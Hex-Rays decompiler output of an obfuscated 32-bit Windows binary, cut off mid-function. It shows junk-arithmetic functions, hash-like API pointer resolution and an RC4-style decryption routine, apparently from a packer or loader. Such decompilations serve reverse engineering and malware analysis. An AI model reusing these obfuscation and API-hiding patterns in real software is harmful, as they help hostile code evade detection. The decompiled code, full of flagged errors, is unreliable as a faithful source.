/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __fastcall sub_401FA2(int a1, int a2, int a3, int a4, int a5);
void sub_402164();
int __fastcall sub_4025BA(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6);
// int __userpurge sub_403193@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebp>, int a4, int a5, int a6);
void __fastcall sub_40332A(int a1, int a2);
// void __usercall sub_403702(int a1@<eax>);
void sub_403A87();
// void __usercall sub_403E94(int a1@<eax>);
// void __usercall sub_403FE4(int a1@<eax>, int a2@<edx>);
// int __userpurge sub_40406A@<eax>(int a1@<eax>, int a2, int a3, int a4);
int __fastcall sub_405EB2(int a1, int a2, int a3, int a4, int a5);
void sub_4077C8();
// void __usercall sub_407B1E(int a1@<eax>, int a2@<ebp>);
int sub_408508();
// void __usercall start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
int __fastcall sub_408B41(int a1, unsigned int a2);
void __fastcall sub_408D9B(int a1, int a2, int a3, int a4, int a5);
// void __usercall sub_40970B(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
unsigned __int8 __cdecl sub_409A1A(_BYTE *a1, unsigned int a2, int a3);
// void __usercall sub_409E1E(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
int __cdecl sub_40A1E8(int a1, int a2, unsigned __int8 *a3);
unsigned int __cdecl sub_40A3DE(_BYTE *a1);
// unsigned int __usercall sub_40A6D2@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<esi>);
void sub_40A82E();
_BYTE *__cdecl sub_40A98D(_BYTE *a1, _BYTE *a2);
void __stdcall sub_40B52D(int a1);
// DWORD (__stdcall **__usercall sub_40B8F1@<eax>(int a1@<esi>))();
// char *__usercall sub_40BD6B@<eax>(int a1@<esi>, int a2);
// char *__usercall sub_40C4BB@<eax>(bool a1@<cf>, int a2@<esi>);
// BOOL __stdcall DisableThreadLibraryCalls(HMODULE hLibModule);
// DWORD __stdcall GetTickCount();
// LONG __stdcall InterlockedCompareExchange(volatile LONG *Destination, LONG Exchange, LONG Comperand);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// void __stdcall Sleep(DWORD dwMilliseconds);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_424D5E; // weak
_UNKNOWN unk_424E5E; // weak
int dword_437004 = 0; // weak
int dword_437008 = 0; // weak
int dword_43700C = 0; // weak
int dword_437010 = 0; // weak
int dword_437014 = 0; // weak
int dword_437018 = 0; // weak
int dword_43701C = 0; // weak
int dword_437020 = 0; // weak
int dword_437024 = 0; // weak
int dword_437028 = 0; // weak
int dword_43702C = 0; // weak
int dword_437030 = 0; // weak
int dword_437034 = 0; // weak
int dword_437038 = 0; // weak
int dword_43703C = 0; // weak
int dword_437040 = 0; // weak
int dword_437044 = 0; // weak
int dword_437048 = 0; // weak
int dword_43704C = 0; // weak
int dword_43707C = 0; // weak
int dword_4371E0 = 0; // weak
int dword_437230 = 0; // weak
int dword_437350 = 0; // weak
int dword_43737C = 0; // weak
int dword_437420 = 0; // weak
int dword_437460 = 0; // weak
int *off_437548 = &dword_437018; // weak
int dword_437568 = 1552224073; // weak
int dword_4375B4 = 1532911360; // weak
int dword_43764C = 820576256; // weak
int dword_4376AC = -1963254389; // weak
_UNKNOWN dword_4376B0; // weak
char byte_437854 = 'Û'; // weak
int dword_43785C = 2066666369; // weak
int dword_437994 = -1968884225; // weak
char byte_437C18 = '\x7F'; // weak
int dword_437C1C = 32768; // weak
int dword_437C24 = 280494080; // weak
int dword_437C3C = 1133200181; // weak
int dword_437F90 = 1484112004; // weak
int dword_4380D8 = -333642990; // weak
int dword_438130 = 1267466239; // weak
int dword_43813C = -1040187403; // weak
int dword_43833C = -1996471413; // weak
char byte_43834C = 'â'; // weak
int dword_43857C = -373011061; // weak
int **off_4385A8 = &off_43753C; // weak
char byte_438628 = '\0'; // weak
int dword_438754 = 1048581; // weak
void *off_43898C = &unk_438414; // weak
_UNKNOWN unk_43899E; // weak
int dword_4389B8 = 0; // weak
int dword_438A9D = 521288629; // weak
int dword_438AAD = 691667403; // weak
int dword_438AB5 = 0; // weak
_UNKNOWN unk_438AB9; // weak
int (__stdcall *dword_438ABB)(_DWORD) = NULL; // weak
__int64 (__fastcall *dword_438ACF)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_438AD7 = 0; // weak
char byte_438AE4 = '\0'; // weak
int dword_438AE7 = 362436069; // weak
int (__fastcall *dword_438AF7)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_438AFB)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_438AFF = 0; // weak
int dword_438B03 = 0; // weak
int (__fastcall *dword_438B0B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_438B13)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_438B33)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_438B37 = 0; // weak
int (__thiscall *unk_438B3F)(_DWORD) = NULL; // weak
char byte_438B40 = '\0'; // weak
_UNKNOWN dword_438B43; // weak
int dword_438B4B = 0; // weak
int dword_438B4F = 2870; // weak
int dword_438B57 = 0; // weak
int (__fastcall *dword_438B5B)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_438B5F = 88675123; // weak
int dword_438B67 = 0; // weak


//----- (00401FA2) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __fastcall sub_401FA2(int a1, int a2, int a3, int a4, int a5)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_403193(a2, a1, (int)&savedregs, a3, a4, a5);
}
// 401FA5: bad sp value at call

//----- (00402164) --------------------------------------------------------
void sub_402164()
{
  sub_403A87();
  sub_408508();
  sub_403A87();
  JUMPOUT(0x40859D);
}
// 404E68: control flows out of bounds to 40859D

//----- (004025BA) --------------------------------------------------------
int __fastcall sub_4025BA(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6)
{
  __int16 v6; // ax
  int result; // eax
  __int16 v8; // [esp+1A4h] [ebp-1D8h]
  int v9; // [esp+350h] [ebp-2Ch]

  v6 = -30539;
  if ( (a2 & a1) != 0 )
    return (v9 ^ v6 & 0x1C5D) - 7023;
  result = 2049;
  if ( (int)a2 >= (int)a1 )
  {
    result = -(a2 < a1);
    if ( !a1 )
    {
      v6 = v8 & 0x36A;
      return (v9 ^ v6 & 0x1C5D) - 7023;
    }
  }
  return result;
}
// 401ADB: variable 'v8' is possibly undefined
// 4089A0: variable 'v9' is possibly undefined

//----- (00403193) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_403193@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebp>, int a4, int a5, int a6)
{
  unsigned int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // edx
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // edx
  unsigned int v16; // edx
  int v17; // ecx
  int v18; // eax
  int v19; // eax
  unsigned int v20; // edx
  unsigned int v21; // eax
  BOOL v22; // ett
  unsigned int v23; // edx
  int v24; // ecx
  unsigned int v25; // eax
  unsigned int v26; // edx
  unsigned int v27; // ecx
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // ecx
  int v33; // eax
  bool v34; // cf
  int v35; // edx
  int v36; // ecx
  int v37; // eax
  int v38; // edx
  int v39; // ecx
  int v40; // eax
  int v41; // edx
  int v42; // ecx
  __int16 v43; // ax
  int v44; // eax
  unsigned int v45; // eax

  v9 = (((unsigned __int16)sub_405EB2(a2, a1, a3 - 224, 58, 33) | 0xFA) - 5849) & 0x1D74;
  if ( v11 )
    goto LABEL_13;
  v12 = 0;
  if ( !v10 )
  {
    *(_DWORD *)(a3 - 204) &= 0x259Eu;
    v9 = -2630;
LABEL_13:
    v12 = 2 * ((2 * v9) ^ 0x3DEC) + __CFADD__((2 * v9) ^ 0x3DEC, (2 * v9) ^ 0x3DEC) + 2 * ((2 * v9) ^ 0x3DEC);
  }
  *(_DWORD *)(a3 - 220) += *(_DWORD *)(a3 - 140) & (v12 - 11784);
  sub_405EB2(v11, a3 - 80, a3 - 80, 8, 6);
  sub_408B41(v24, v23);
  v45 = ((((unsigned __int16)sub_405EB2(v13, a3 - 164, a3 - 164, 20, 11) ^ 0x1DEF | 0x3B4E) ^ 0x3A5F | 0x3F02) ^ 0x1E20) & 0x1108;
  *(_DWORD *)(a3 - 44) |= v45;
  v34 = v45 < 0x1BB2;
  v45 -= 7090;
  v22 = v34;
  v34 = __CFADD__(v34, v45);
  v21 = v22 + v45;
  v34 |= __CFADD__(v21, 12756);
  v21 += 12756;
  *(_DWORD *)(a3 - 4) -= v34 + v21;
  v29 = v21 & 0x994;
  if ( !v36 || !v29 )
    v29 = 0;
  v25 = ((unsigned __int16)sub_40406A(v29, 0, -174846726, 0) | 0x3A4) & 0x3564;
  if ( v27 >= v25 )
    *(_DWORD *)(a3 - 304) = (__PAIR64__(*(_DWORD *)(a3 - 304), v27) - __PAIR64__(v25, v25)) >> 32;
  v19 = sub_408B41(v27, v26);
  *(_DWORD *)(a3 - 276) &= v19;
  v30 = *(_DWORD *)(a3 - 4) | (((2 * ((*(_DWORD *)(a3 - 160) + v19) ^ 0xC46 | 0xA2B)) ^ 0x31C3) - 6955);
  v40 = v30 & 0x283D;
  if ( !v40 )
    v40 = 0;
  v7 = (((unsigned __int16)sub_4025BA(a3 - 132, v20, a3 - 132, 0, v40, v40) | 0xAEA) ^ 0x1C6D | 0x2118) & 0x225C;
  v31 = (((_WORD)v7 - 196 - ((v7 < 0xC4) + 4085) - ((v7 - 196 < (unsigned int)(v7 < 0xC4) + 4085) + 5496) - 2237) & 0x382C)
      + 6638;
  if ( v8 || (v14 = v31 + 11110) == 0 )
    LOWORD(v14) = 0;
  *(_DWORD *)(a3 - 260) += v14 & 0x2308;
  sub_40406A(0, 0, 0, 0);
  v28 = (*(_WORD *)(a3 - 56) & 0x5A5 ^ 0x31DE) + 14871;
  if ( (v39 & v38) < 0 )
  {
    v28 &= 0xAAEu;
LABEL_23:
    v28 *= 2;
    goto LABEL_9;
  }
  if ( (*(_WORD *)(a3 - 56) & 0x5A5 ^ 0x31DE) != -14871 )
    goto LABEL_23;
LABEL_9:
  *(_DWORD *)(a3 - 152) ^= v28;
  sub_403702(*(unsigned __int16 *)(a3 - 108) | 0x3BA0);
  v44 = 2 * (v43 & 0x3609);
  *(_DWORD *)(a3 - 48) |= v44;
  v37 = v44 - 16173;
  if ( v37 < 0 )
    goto LABEL_41;
  if ( v41 )
    JUMPOUT(0x407988);
  if ( !v42 )
LABEL_41:
    JUMPOUT(0x40884A);
  sub_408508();
  v33 = (__PAIR64__((unsigned int)*(unsigned __int16 *)(a3 - 128) - 4694, *(unsigned __int16 *)(a3 - 128))
       - 0x286C00001256i64) >> 32;
  v34 = 0;
  if ( v35 < 0 )
    goto LABEL_39;
  if ( !v32 )
  {
    v34 = __CFADD__(v33, *(_DWORD *)(a3 - 332));
    *(_DWORD *)(a3 - 332) += v33;
LABEL_39:
    v33 -= v34 + 15349;
  }
  sub_403702(v33);
  sub_405EB2(0, v15, a3 - 124, 55, 25);
  v18 = sub_408B41(v17, v16);
  return v34 + v18 + 3598;
}
// 4012A5: positive sp value 4 has been found
// 401B5A: control flows out of bounds to 40884A
// 4030F6: control flows out of bounds to 4095DE
// 40499A: control flows out of bounds to 407988
// 401608: conditional instruction was optimized away because of 'ecx.4==0'
// 40606F: conditional instruction was optimized away because of 'ecx.4==0'
// 403791: variable 'v15' is possibly undefined
// 40379D: variable 'v17' is possibly undefined
// 40379D: variable 'v16' is possibly undefined
// 40129F: variable 'v34' is possibly undefined
// 402EAA: variable 'v11' is possibly undefined
// 402EB6: variable 'v10' is possibly undefined
// 403715: variable 'v20' is possibly undefined
// 403817: variable 'v27' is possibly undefined
// 403817: variable 'v26' is possibly undefined
// 4084C2: variable 'v43' is possibly undefined
// 40422D: variable 'v42' is possibly undefined
// 404A8E: variable 'v8' is possibly undefined
// 4050B8: variable 'v41' is possibly undefined
// 40639F: variable 'v35' is possibly undefined
// 4063A7: variable 'v32' is possibly undefined
// 406C49: variable 'v24' is possibly undefined
// 406C49: variable 'v23' is possibly undefined
// 402F1F: variable 'v13' is possibly undefined
// 40708B: variable 'v36' is possibly undefined
// 407856: variable 'v39' is possibly undefined
// 407856: variable 'v38' is possibly undefined

//----- (0040332A) --------------------------------------------------------
void __fastcall sub_40332A(int a1, int a2)
{
  unsigned int v2; // edx
  int v3; // eax
  unsigned int v4; // edx
  int v5; // ecx
  int v6; // eax
  char v7[12]; // [esp+5Ch] [ebp-2A0h] BYREF
  int v8; // [esp+70h] [ebp-28Ch]
  int v9; // [esp+E0h] [ebp-21Ch]
  int v10; // [esp+14Ch] [ebp-1B0h]
  int v11; // [esp+190h] [ebp-16Ch]
  char v12[32]; // [esp+1B8h] [ebp-144h] BYREF
  int v13; // [esp+2E0h] [ebp-1Ch]

  sub_405EB2((int)v7, a2, (int)v7, 26, 41);
  v3 = sub_4025BA((unsigned int)v12, v2, (int)v12, 0, -983725123, v11);
  if ( v5 < 0 )
  {
    v6 = v3 & 0x11AD;
  }
  else
  {
    v6 = v3 - 13153;
    if ( v6 >= 0 )
    {
      if ( v4 <= v5 )
        JUMPOUT(0x405FB5);
LABEL_7:
      v9 += 4500;
      JUMPOUT(0x405EE0);
    }
  }
  v13 += v6;
  v8 |= v6;
  v10 &= v6 + 5459;
  goto LABEL_7;
}
// 402419: control flows out of bounds to 405FB5
// 406FCC: control flows out of bounds to 405EE0
// 401D20: conditional instruction was optimized away because of 'eax.4==1194'
// 4011C5: variable 'v2' is possibly undefined
// 4011CC: variable 'v5' is possibly undefined
// 4030CB: variable 'v4' is possibly undefined

//----- (00403702) --------------------------------------------------------
void __usercall sub_403702(int a1@<eax>)
{
  int v1; // [esp-B0h] [ebp-B4h]

  sub_40406A(a1, 0, v1, 0);
  sub_408508();
  JUMPOUT(0x40863B);
}
// 406F24: control flows out of bounds to 40863B
// 406F0C: variable 'v1' is possibly undefined

//----- (00403A87) --------------------------------------------------------
void sub_403A87()
{
  sub_408508();
  sub_408508();
  sub_408508();
  sub_408508();
  JUMPOUT(0x40882D);
}
// 403ACE: control flows out of bounds to 40882D

//----- (00403E94) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_403E94(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_407B1E(a1, (int)&savedregs);
}
// 403E97: bad sp value at call

//----- (00403FE4) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_403FE4(int a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v3; // eax
  unsigned int v4; // edx
  int v5; // ecx
  char v6; // cf
  int v7; // eax
  int v8; // edx
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  unsigned __int8 v12; // [esp-280h] [ebp-284h]
  unsigned int v13; // [esp-200h] [ebp-204h]
  int v14; // [esp-CCh] [ebp-D0h]
  _BYTE v15[8]; // [esp-74h] [ebp-78h] BYREF
  int v16; // [esp-6Ch] [ebp-70h]
  int v17; // [esp-64h] [ebp-68h]
  int v18; // [esp-4Ch] [ebp-50h]

  v3 = (a1 ^ 0x206C) + (v13 < (a1 ^ 0x206Cu)) + (a1 ^ 0x206C);
  if ( (a2 & v3) != 0 )
    v3 = 2874;
  v16 += v3 - v14;
  sub_402164();
  sub_403A87();
  if ( v9 == v8 )
  {
    v2 = v12 - 5345;
    if ( v2 < 0 )
      goto LABEL_9;
    if ( (v8 & v9) != 0 )
    {
LABEL_10:
      sub_402164();
      sub_403A87();
      sub_403A87();
      sub_403A87();
      sub_408B41(v5, v4);
      sub_408508();
      sub_402164();
      sub_40406A(v7 - (v6 + 4791), 0, -1027391242, 0);
      sub_40406A(0, 0, 0, 0);
      sub_4025BA((unsigned int)v15, 0, (int)v15, 0, v11, v10);
      JUMPOUT(0x405F4A);
    }
  }
  v2 = v17;
LABEL_9:
  v18 += v2;
  goto LABEL_10;
}
// 408915: control flows out of bounds to 405F4A
// 40890A: bad sp value at call
// 402337: variable 'v13' is possibly undefined
// 406061: variable 'v8' is possibly undefined
// 406061: variable 'v9' is possibly undefined
// 403110: variable 'v14' is possibly undefined
// 4080C3: variable 'v12' is possibly undefined
// 4067E1: variable 'v5' is possibly undefined
// 4067E1: variable 'v4' is possibly undefined
// 406805: variable 'v7' is possibly undefined
// 406805: variable 'v6' is possibly undefined
// 40890A: variable 'v11' is possibly undefined
// 40890A: variable 'v10' is possibly undefined

//----- (0040406A) --------------------------------------------------------
int __userpurge sub_40406A@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int result; // eax

  result = (a1 ^ 0x1199) - 9937;
  if ( result )
    result = 0;
  return result;
}

//----- (00405EB2) --------------------------------------------------------
int __fastcall sub_405EB2(int a1, int a2, int a3, int a4, int a5)
{
  __int16 v5; // ax
  __int16 v6; // ax
  int v8; // eax
  unsigned int v9; // [esp+120h] [ebp-1D8h]
  unsigned __int8 v10; // [esp+12Ch] [ebp-1CCh]

  v5 = 1527;
  if ( a2 )
    goto LABEL_4;
  v6 = v10;
  if ( !a1 )
  {
    v8 = __CFADD__((v10 | 0x3631) - 11927 + 9660, 9939) + (v10 | 0x3631) - 11927 + 19599 + 10392;
    v5 = (((__PAIR64__(v8 - 8349, v8) - __PAIR64__(v9, 8349)) >> 32) - 12446) & 0x45B;
LABEL_4:
    v6 = v5 ^ 0xB96;
  }
  return (__PAIR64__(
            ((v6 - 16066) & 0x348F ^ 0x3C49)
          + 6588
          - ((((v6 - 16066) & 0x348F ^ 0x3C49u | 0x8D00000000ui64) + 6588) >> 32),
            ((v6 - 16066) & 0x348F ^ 0x3C49u) + 6588)
        - (((unsigned int)__CFADD__((v6 - 16066) & 0x348F ^ 0x3C49, 6588) + 141) | 0x124400000000i64)) >> 32;
}
// 408FB2: conditional instruction was optimized away because of 'ecx.4==0'
// 406009: variable 'v10' is possibly undefined
// 408FAA: variable 'v9' is possibly undefined

//----- (004077C8) --------------------------------------------------------
void sub_4077C8()
{
  sub_408508();
  JUMPOUT(0x4086DD);
}
// 408C69: control flows out of bounds to 4086DD

//----- (00407B1E) --------------------------------------------------------
void __usercall sub_407B1E(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 504) |= a1;
  sub_403A87();
  JUMPOUT(0x402678);
}
// 408AA1: control flows out of bounds to 402678

//----- (00408508) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_408508()
{
  unsigned __int8 v1; // [esp+1FCh] [ebp-198h]

  return v1;
}
// 409905: positive sp value 1F0 has been found
// 40779C: variable 'v1' is possibly undefined

//----- (004089C3) --------------------------------------------------------
void __usercall start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  unsigned int v5; // edx
  int v6; // ecx
  unsigned __int8 v7; // [esp+48h] [ebp-E8h]
  unsigned __int8 v8; // [esp+8Ch] [ebp-A4h]
  int savedregs; // [esp+130h] [ebp+0h] BYREF

  dword_438B4B = a3;
  dword_43704C = 20207;
  dword_438B37 = a5;
  dword_438B57 = a4;
  dword_438AB5 = a1;
  LOBYTE(dword_437014) = dword_437014 - 124;
  dword_438B03 = a2;
  dword_438AFF = (int)&savedregs;
  sub_408508();
  if ( v5 <= ((2 * (v7 + 13999)) & 0x176Eu) && v8 == v6 && v6 < 0 )
    JUMPOUT(0x405B8F);
  JUMPOUT(0x4021A4);
}
// 403C12: control flows out of bounds to 4021A4
// 4071E4: control flows out of bounds to 405B8F
// 4015D7: conditional instruction was optimized away because of 'edx.4==0'
// 4058AF: variable 'v5' is possibly undefined
// 407194: variable 'v7' is possibly undefined
// 4058B5: variable 'v8' is possibly undefined
// 4058BE: variable 'v6' is possibly undefined
// 437014: using guessed type int dword_437014;
// 43704C: using guessed type int dword_43704C;
// 438AB5: using guessed type int dword_438AB5;
// 438AFF: using guessed type int dword_438AFF;
// 438B03: using guessed type int dword_438B03;
// 438B37: using guessed type int dword_438B37;
// 438B4B: using guessed type int dword_438B4B;
// 438B57: using guessed type int dword_438B57;

//----- (00408B41) --------------------------------------------------------
int __fastcall sub_408B41(int a1, unsigned int a2)
{
  int v2; // eax
  int v3; // eax
  __int16 v4; // ax
  bool v5; // cf
  int result; // eax
  __int16 v7; // ax
  int v8; // eax
  unsigned __int16 v9; // [esp+F4h] [ebp-D4h]
  unsigned int v10; // [esp+114h] [ebp-B4h]
  int v11; // [esp+144h] [ebp-84h]
  int v12; // [esp+148h] [ebp-80h]
  unsigned __int8 v13; // [esp+190h] [ebp-38h]
  unsigned __int8 v14; // [esp+1B8h] [ebp-10h]

  v4 = v9;
  if ( ((unsigned __int16)a2 & v9) != 0 || (v5 = a2 < v9, a2 >= v9) )
  {
    v4 = v9 | 0x9CA;
    v5 = 0;
  }
  v7 = v4 - (v5 + 3734);
  if ( (v7 & 0x3E52) != 0 )
    v8 = (v11 | (((v14 < v10) + v14 - v10 + 6429 < 0x1507) + (v14 < v10) + v14 - (_WORD)v10 + 1046 + 5048) & 0x157A) ^ 0x3222;
  else
    v8 = 10433;
  v3 = v12 + ((unsigned int)(v8 + 5069) < 0x13F5) + v8 - 40;
  v2 = __CFADD__(v3, 11272)
     + v3
     + 11272
     + 1419
     - ((__CFADD__(__CFADD__(v3, 11272), v3 + 11272) | __CFADD__(__CFADD__(v3, 11272) + v3 + 11272, 1419))
      + 5294);
  result = ((__CFADD__(__CFADD__(v2, 1373), v2 + 1373) | __CFADD__(__CFADD__(v2, 1373) + v2 + 1373, 4000))
          + __CFADD__(v2, 1373)
          + v2
          + 1373
          + 4000
          + 140) | 0x2154;
  if ( a1 )
    result = ((v13 | 0x2FF3) ^ 0x20AC) + 8167;
  return result;
}
// 407C69: variable 'v11' is possibly undefined
// 401AC8: variable 'v14' is possibly undefined
// 401FFC: variable 'v10' is possibly undefined
// 402115: variable 'v12' is possibly undefined
// 40292B: variable 'v13' is possibly undefined
// 40446C: variable 'v9' is possibly undefined

//----- (00408D9B) --------------------------------------------------------
void __fastcall sub_408D9B(int a1, int a2, int a3, int a4, int a5)
{
  sub_40332A(0, a2);
}

//----- (0040970B) --------------------------------------------------------
void __usercall sub_40970B(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ebx
  int *v4; // edi
  int v5; // esi
  char *v6; // eax
  char *v7; // eax
  int v8; // esi
  int v9; // edx
  int v10; // ebx
  char *v11; // eax
  int v12; // edi
  char *v13; // eax
  char *v14; // eax
  int v15; // esi
  char *v16; // eax
  bool v17; // cf
  int v18; // edx
  unsigned int v19; // ecx
  unsigned int v20; // edx
  char *v21; // eax
  unsigned __int16 v22; // dx
  int v23; // esi
  int v24; // ebx
  int v25; // ebx
  int v26; // [esp-4h] [ebp-4h]
  int v27; // [esp-4h] [ebp-4h]
  int v28; // [esp-4h] [ebp-4h]

  dword_43703C += 23023;
  v6 = sub_40BD6B(a3 - dword_43737C, 262468866);
  dword_43701C += v26;
  if ( v6 )
  {
    v5 = dword_437C1C - 549;
    dword_437030 = dword_437C1C - 549;
    dword_438ACF = (__int64 (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v6;
    dword_437020 = a1;
    dword_437040 -= a2;
    dword_43702C -= v5;
    v11 = sub_40BD6B(v5, 1493072574);
    dword_43703C -= 19745;
    if ( v11 )
    {
      dword_438B5B = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD))v11;
      v12 = dword_43813C + v27 + 28128;
      v13 = sub_40BD6B(dword_43707C, 150532372);
      dword_437008 = v12;
      if ( v13 )
      {
        LOBYTE(dword_437030) = -98;
        dword_438B13 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v13;
        dword_437034 -= 23931;
        v21 = sub_40BD6B(25652, 1916711125);
        v23 = dword_438754;
        v24 = v17 + 54346;
        dword_437024 += v12;
        LOBYTE(v24) = byte_438B40;
        if ( v21 )
        {
          unk_438B3F = (int (__thiscall *)(_DWORD))v21;
          v25 = v24 - ((((unsigned int)dword_437008 | 0x5AF100000000i64) + (unsigned __int64)v22) >> 32);
          v7 = sub_40BD6B(dword_438754, v28);
          v8 = v23 - dword_43785C;
          v10 = v9 + v25;
          dword_43701C = v10;
          if ( v7 )
          {
            dword_438ABB = (int (__stdcall *)(_DWORD))v7;
            v4 = off_437548;
            LOBYTE(dword_43703C) = 88;
            v14 = sub_40BD6B(v8, 1216340331);
            dword_437028 -= (int)v4;
            if ( v14 )
            {
              dword_438B0B = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v14;
              v3 = v10 + 22480;
              dword_43702C = v3;
              v15 = dword_4371E0;
              v16 = sub_40BD6B(dword_4371E0, 255840707);
              dword_43703C -= v3;
              if ( v16 )
              {
                LOBYTE(dword_437040) = dword_437040 - 8;
                dword_438AF7 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v16;
                v17 = __CFADD__(&ReadFile, dword_437020);
                dword_437020 += (int)&ReadFile;
                sub_40C4BB(v17, v15);
                v20 = v19 + v17 + v18;
                v17 = dword_437040 < v19;
                dword_437040 -= v19;
                LOBYTE(dword_437034) = dword_437034 - 81;
                dword_43701C = v17 + v20 + 8090;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  JUMPOUT(0x40BA92);
}
// 40C254: control flows out of bounds to 40BA92
// 40A980: variable 'v26' is possibly undefined
// 40B637: variable 'v27' is possibly undefined
// 40C30E: variable 'v19' is possibly undefined
// 40C30E: variable 'v17' is possibly undefined
// 40C30E: variable 'v18' is possibly undefined
// 40C5D0: variable 'v22' is possibly undefined
// 40ABA7: variable 'v28' is possibly undefined
// 40ABB8: variable 'v9' is possibly undefined
// 437008: using guessed type int dword_437008;
// 43701C: using guessed type int dword_43701C;
// 437020: using guessed type int dword_437020;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 43702C: using guessed type int dword_43702C;
// 437030: using guessed type int dword_437030;
// 437034: using guessed type int dword_437034;
// 43703C: using guessed type int dword_43703C;
// 437040: using guessed type int dword_437040;
// 43707C: using guessed type int dword_43707C;
// 4371E0: using guessed type int dword_4371E0;
// 43737C: using guessed type int dword_43737C;
// 437548: using guessed type int *off_437548;
// 43785C: using guessed type int dword_43785C;
// 437C1C: using guessed type int dword_437C1C;
// 43813C: using guessed type int dword_43813C;
// 438754: using guessed type int dword_438754;
// 438ABB: using guessed type int (__stdcall *dword_438ABB)(_DWORD);
// 438ACF: using guessed type __int64 (__fastcall *dword_438ACF)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438AD7: using guessed type int dword_438AD7;
// 438AF7: using guessed type int (__fastcall *dword_438AF7)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438B0B: using guessed type int (__fastcall *dword_438B0B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438B13: using guessed type int (__thiscall *dword_438B13)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438B3F: using guessed type int (__thiscall *unk_438B3F)(_DWORD);
// 438B40: using guessed type char byte_438B40;
// 438B5B: using guessed type int (__fastcall *dword_438B5B)(_DWORD, _DWORD, _DWORD, _DWORD);
// 438B67: using guessed type int dword_438B67;

//----- (00409A1A) --------------------------------------------------------
unsigned __int8 __cdecl sub_409A1A(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 result; // al
  _BYTE *i; // [esp+Ch] [ebp-Ch]
  unsigned int v6; // [esp+10h] [ebp-8h]
  unsigned __int8 v7; // [esp+17h] [ebp-1h]

  v3 = *(_BYTE *)(a3 + 256);
  v7 = *(_BYTE *)(a3 + 257);
  v6 = 0;
  for ( i = a1; v6 < a2; ++i )
  {
    v3 = (v3 + 1) % 256;
    v7 += *(_BYTE *)(a3 + v3);
    sub_40A98D((_BYTE *)(a3 + v3), (_BYTE *)(a3 + v7));
    *i ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v7) + *(_BYTE *)(a3 + v3)));
    ++v6;
  }
  *(_BYTE *)(a3 + 256) = v3;
  result = v7;
  *(_BYTE *)(a3 + 257) = v7;
  return result;
}

//----- (00409E1E) --------------------------------------------------------
void __usercall sub_409E1E(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  LOBYTE(dword_437018) = dword_437018 - 31;
  qmemcpy(a2, a3, a1);
}
// 437018: using guessed type int dword_437018;

//----- (0040A1E8) --------------------------------------------------------
int __cdecl sub_40A1E8(int a1, int a2, unsigned __int8 *a3)
{
  int result; // eax
  int v4; // et2
  unsigned int i; // esi
